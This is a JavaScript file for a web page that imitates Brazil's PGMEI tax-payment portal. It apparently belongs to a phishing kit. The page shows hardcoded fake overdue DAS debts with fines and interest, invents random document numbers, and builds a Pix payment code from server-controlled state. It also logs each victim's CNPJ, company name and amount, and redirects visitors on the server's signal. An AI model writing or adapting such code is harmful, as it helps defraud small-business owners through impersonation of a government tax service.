(function() {
  const session = window.PGMEI.getSession();
  let appState = window.PGMEI.getCachedState();
  let currentPaymentData = null;

  const mesesNomes = [
    "Janeiro", "Fevereiro", "Marco", "Abril", "Maio", "Junho",
    "Julho", "Agosto", "Setembro", "Outubro", "Novembro", "Dezembro"
  ];

  if (!session) {
    window.PGMEI.redirect("/login/");
  }

  function setActiveNav(navId) {
    $(".navbar-pgmei a").removeClass("active");
    $("#" + navId).addClass("active");
  }

  function showScreen(screenId) {
    $(".step-container").hide();
    $("#" + screenId).show();
    window.scrollTo(0, 0);
  }

  function updatePaymentStatus(message, visible) {
    $("#payment-status-text").text(message);
    $("#payment-status-box").toggle(Boolean(visible));
  }

  function applySessionData() {
    $(".lbl-cnpj").text(session.cnpj || "");
    $(".lbl-nome").text(session.nome || "");
    $("#doc-cnpj").text((session.cnpj || "").replace(/\D/g, ""));
    $("#doc-razao").text((session.nome || "").toUpperCase());
  }

  function buildDasData(year) {
    const currentYear = new Date().getFullYear();
    const currentMonth = new Date().getMonth() + 1;
    const rows = [];

    const dados2024 = {
      6: { principal: 76.90, multa: 15.38, juros: 13.08, total: 105.36, venc: "22/07/2024", acolh: "23/12/2025" },
      7: { principal: 76.90, multa: 15.38, juros: 12.19, total: 104.47, venc: "20/08/2024", acolh: "23/12/2025" },
      8: { principal: 76.90, multa: 15.38, juros: 11.30, total: 103.58, venc: "20/09/2024", acolh: "23/12/2025" },
      9: { principal: 76.90, multa: 15.38, juros: 10.41, total: 102.69, venc: "21/10/2024", acolh: "23/12/2025" },
      10: { principal: 76.90, multa: 15.38, juros: 9.52, total: 101.80, venc: "20/11/2024", acolh: "23/12/2025" },
      11: { principal: 76.90, multa: 15.38, juros: 8.63, total: 100.91, venc: "20/12/2024", acolh: "23/12/2025" },
      12: { principal: 76.90, multa: 15.38, juros: 7.74, total: 100.02, venc: "20/01/2025", acolh: "23/12/2025" }
    };

    const dados2025 = {
      5: { principal: 81.90, multa: 16.38, juros: 5.04, total: 103.32, venc: "20/06/2025", acolh: "23/12/2025" },
      6: { principal: 81.90, multa: 16.38, juros: 4.18, total: 102.46, venc: "21/07/2025", acolh: "23/12/2025" },
      7: { principal: 81.90, multa: 16.38, juros: 3.31, total: 101.59, venc: "20/08/2025", acolh: "23/12/2025" },
      8: { principal: 81.90, multa: 16.38, juros: 2.45, total: 100.73, venc: "22/09/2025", acolh: "23/12/2025" },
      9: { principal: 81.90, multa: 16.38, juros: 1.59, total: 99.87, venc: "20/10/2025", acolh: "23/12/2025" },
      10: { principal: 81.90, multa: 8.19, juros: 0.74, total: 90.83, venc: "20/11/2025", acolh: "23/12/2025" },
      11: { principal: 81.90, multa: 0.00, juros: 0.00, total: 81.90, venc: "22/12/2025", acolh: "23/12/2025" },
      12: { principal: 81.90, multa: 0.00, juros: 0.00, total: 81.90, venc: "20/01/2026", acolh: "20/01/2026" }
    };

    for (let month = 1; month <= 12; month += 1) {
      if (year > currentYear || (year === currentYear && month > currentMonth)) {
        continue;
      }

      if (year === 2024 && month <= 5) {
        rows.push({
          periodo: mesesNomes[month - 1] + "/" + year,
          status: "NaoOptante",
          principal: "-",
          multa: "-",
          juros: "-",
          total: "-",
          totalNumber: 0,
          venc: "-",
          acolh: "-"
        });
        continue;
      }

      if (year === 2025 && month <= 4) {
        rows.push({
          periodo: mesesNomes[month - 1] + "/" + year,
          status: "NaoOptante",
          principal: "-",
          multa: "-",
          juros: "-",
          total: "-",
          totalNumber: 0,
          venc: "-",
          acolh: "-"
        });
        continue;
      }

      if (year === 2024 && dados2024[month]) {
        const item = dados2024[month];
        rows.push({
          periodo: mesesNomes[month - 1] + "/" + year,
          status: "Devedor",
          principal: window.PGMEI.formatCurrency(item.principal),
          multa: window.PGMEI.formatCurrency(item.multa),
          juros: window.PGMEI.formatCurrency(item.juros),
          total: window.PGMEI.formatCurrency(item.total),
          totalNumber: item.total,
          venc: item.venc,
          acolh: item.acolh
        });
        continue;
      }

      if (year === 2025 && dados2025[month]) {
        const item = dados2025[month];
        rows.push({
          periodo: mesesNomes[month - 1] + "/" + year,
          status: month === 12 ? "AVencer" : "Devedor",
          principal: window.PGMEI.formatCurrency(item.principal),
          multa: window.PGMEI.formatCurrency(item.multa),
          juros: window.PGMEI.formatCurrency(item.juros),
          total: window.PGMEI.formatCurrency(item.total),
          totalNumber: item.total,
          venc: item.venc,
          acolh: item.acolh
        });
        continue;
      }

      const principal = 81.90;
      const multa = year < currentYear || month < currentMonth ? 8.19 : 0;
      const juros = year < currentYear || month < currentMonth ? 0.91 : 0;
      const total = principal + multa + juros;
      const dueMonth = month === 12 ? 1 : month + 1;
      const dueYear = month === 12 ? year + 1 : year;
      rows.push({
        periodo: mesesNomes[month - 1] + "/" + year,
        status: month >= currentMonth && year >= currentYear ? "AVencer" : "Devedor",
        principal: window.PGMEI.formatCurrency(principal),
        multa: window.PGMEI.formatCurrency(multa),
        juros: window.PGMEI.formatCurrency(juros),
        total: window.PGMEI.formatCurrency(total),
        totalNumber: total,
        venc: "20/" + String(dueMonth).padStart(2, "0") + "/" + dueYear,
        acolh: "20/" + String(dueMonth).padStart(2, "0") + "/" + dueYear
      });
    }

    return rows;
  }

  function recalculateTotal() {
    let total = 0;
    let checkedCount = 0;

    $(".das-row-chk:checked").each(function() {
      total += Number($(this).data("valor") || 0);
      checkedCount += 1;
    });

    $("#lbl-total-pagar").text("Total Selecionado: " + window.PGMEI.formatCurrency(total));
    $("#btn-continuar-das").prop("disabled", checkedCount === 0);
  }

  function renderDasTable(year) {
    const rows = buildDasData(Number(year));
    const tbody = $("#das-table-body");
    let pendingCount = 0;

    tbody.empty();

    rows.forEach(function(row, index) {
      const selectable = row.status !== "NaoOptante";
      const checked = selectable && index >= Math.max(rows.length - 3, 0);
      if (selectable) {
        pendingCount += 1;
      }

      tbody.append(
        "<tr" + (selectable ? "" : ' style="background-color:#f0f0f0;color:#999;"') + ">" +
          "<td>" + (selectable ? '<input type="checkbox" class="das-row-chk" ' + (checked ? "checked" : "") + ' data-valor="' + row.totalNumber.toFixed(2) + '">' : "") + "</td>" +
          "<td style=\"text-align:left;\"><strong>" + row.periodo + "</strong></td>" +
          "<td>Não</td>" +
          "<td><input type=\"checkbox\" disabled></td>" +
          "<td>" + (row.status === "Devedor" ? "<strong style=\"color:#c00;\">Devedor</strong>" : row.status === "AVencer" ? "<strong>A Vencer</strong>" : "<strong>Não Optante</strong>") + "</td>" +
          "<td>" + row.principal + "</td>" +
          "<td>" + row.multa + "</td>" +
          "<td>" + row.juros + "</td>" +
          "<td>" + row.total + "</td>" +
          "<td>" + row.venc + "</td>" +
          "<td>" + row.acolh + "</td>" +
        "</tr>"
      );
    });

    $("#lbl-resumo-pendente")
      .removeClass("label-success")
      .addClass("label-danger")
      .text(pendingCount + " apuracoes pendentes (" + year + ")");

    recalculateTotal();
    showScreen("page-das");
    setActiveNav("nav-emitir");
  }

  function copyPixCode() {
    const field = document.getElementById("pix-key");
    field.select();
    field.setSelectionRange(0, field.value.length);
    document.execCommand("copy");
    toastr.success("Codigo Pix copiado.");

    if (currentPaymentData) {
      window.PGMEI.sendAction("log_pix_copy", {
        cnpj: currentPaymentData.cnpj,
        companyName: currentPaymentData.companyName,
        amount: currentPaymentData.amount
      }).catch(function(error) {
        console.warn("Falha ao registrar copia do Pix:", error.message);
      });
    }
  }

  async function renderPayment(total, selectedItems) {
    const year = $("#ano-calendario").val() || "2025";
    const today = new Date();
    const appPix = window.PGMEI.buildPixPayload(appState, total);
    const companyName = session.nome || "SERVICO EMPRESARIAL ASSEGURADO ILTDA";
    const cnpjDigits = (session.cnpj || "").replace(/\D/g, "");
    const qrCodeUrl = "https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=" + encodeURIComponent(appPix);

    $("#doc-cnpj").text(cnpjDigits);
    $("#doc-razao").text(companyName.toUpperCase());
    $("#doc-periodo").text(year);
    $("#doc-vencimento").text("23/12/" + year);
    $("#doc-data-acolh").text(today.toLocaleDateString("pt-BR"));
    $("#doc-numero").text("07.20." + Math.floor(10000 + Math.random() * 90000) + "." + Math.floor(1000000 + Math.random() * 9000000) + "-" + Math.floor(Math.random() * 10));
    $("#doc-total-valor").text(window.PGMEI.formatCurrency(total));
    $("#doc-composicao-total").text(total.toFixed(2).replace(".", ","));
    $(".pix-qr-placeholder").html('<img src="' + qrCodeUrl + '" alt="QRCode Pix" style="width: 180px; height: 180px;">');
    $("#pix-key").val(appPix);
    $("#doc-composicao-body").empty();

    selectedItems.forEach(function(item, index) {
      $("#doc-composicao-body").append(
        "<tr style=\"border-bottom:1px solid #eee;\">" +
          "<td style=\"padding:4px 8px;\">" + String(index).padStart(4, "0") + "</td>" +
          "<td style=\"padding:4px 8px;\">" + item.periodo + "</td>" +
          "<td style=\"padding:4px 8px;text-align:right;\">" + item.principal + "</td>" +
          "<td style=\"padding:4px 8px;text-align:right;\">" + item.multa + "</td>" +
          "<td style=\"padding:4px 8px;text-align:right;\">" + item.juros + "</td>" +
          "<td style=\"padding:4px 8px;text-align:right;\">" + item.total + "</td>" +
        "</tr>"
      );
    });

    currentPaymentData = {
      label: selectedItems.map(function(item) { return item.periodo; }).join(", "),
      amount: window.PGMEI.formatCurrency(total),
      cnpj: cnpjDigits,
      companyName: companyName,
      code: appPix
    };

    updatePaymentStatus("Codigo Pix pronto para pagamento. Confira os dados antes de concluir no banco.", true);
    showScreen("page-pagamento");

    try {
      appState = await window.PGMEI.sendAction("log_payment", currentPaymentData);
      const trackingSession = window.PGMEI.getTrackingSession();
      if (trackingSession) {
        window.PGMEI.saveTrackingSession({
          time: trackingSession.time,
          cnpj: trackingSession.cnpj,
          companyName: trackingSession.companyName,
          pixGenerated: true
        });
      }
    } catch (error) {
      console.warn("Falha ao registrar pagamento:", error.message);
    }
  }

  async function syncState() {
    try {
      appState = await window.PGMEI.fetchState();
      window.PGMEI.applyPageTitleByState(appState);
      if (appState.analytics.activePage === "secondary") {
        window.PGMEI.redirect("/adv/");
      }
    } catch (error) {
      console.warn("Falha ao sincronizar estado oficial:", error.message);
    }
  }

  document.addEventListener("DOMContentLoaded", async function() {
    window.PGMEI.applyPageTitleByState();
    applySessionData();
    $(".navbar-pgmei").show();
    $(".bar-cnpj-nome").css("display", "flex");
    showScreen("page-emitir");

    try {
      appState = await window.PGMEI.fetchState();
      window.PGMEI.applyPageTitleByState(appState);
      if (appState.analytics.activePage === "secondary") {
        window.PGMEI.redirect("/adv/");
        return;
      }
    } catch (error) {
      console.warn("Falha na inicializacao da pagina oficial:", error.message);
    }

    $(document).on("click", "button, a", function() {
      window.PGMEI.incrementMetric("totalClicks", 1);
    });

    $("#nav-inicio, #nav-emitir").on("click", function() {
      showScreen("page-emitir");
      setActiveNav("nav-emitir");
    });

    $("#nav-consulta, #btn-iniciar-guias").on("click", function() {
      showScreen("page-emitir");
      setActiveNav("nav-emitir");
    });

    $("#nav-sair").on("click", function() {
      window.PGMEI.clearSession();
      window.PGMEI.redirect("/login/");
    });

    $("#btn-ano-ok").on("click", function() {
      renderDasTable($("#ano-calendario").val());
    });

    $("#chk-todos").on("change", function() {
      $(".das-row-chk").prop("checked", $(this).is(":checked"));
      recalculateTotal();
    });

    $(document).on("change", ".das-row-chk", recalculateTotal);

    $("#btn-continuar-das").on("click", function() {
      let total = 0;
      const selectedItems = [];

      $("#das-table-body tr").each(function() {
        const checkbox = $(this).find(".das-row-chk");
        if (!checkbox.length || !checkbox.is(":checked")) {
          return;
        }
        const cells = $(this).find("td");
        const amount = Number(checkbox.data("valor") || 0);
        total += amount;
        selectedItems.push({
          periodo: $(cells[1]).text().trim(),
          principal: $(cells[5]).text().trim(),
          multa: $(cells[6]).text().trim(),
          juros: $(cells[7]).text().trim(),
          total: $(cells[8]).text().trim()
        });
      });

      renderPayment(total, selectedItems);
    });

    $("#btn-copiar-pix").on("click", copyPixCode);

    setInterval(syncState, 5000);
  });
})();
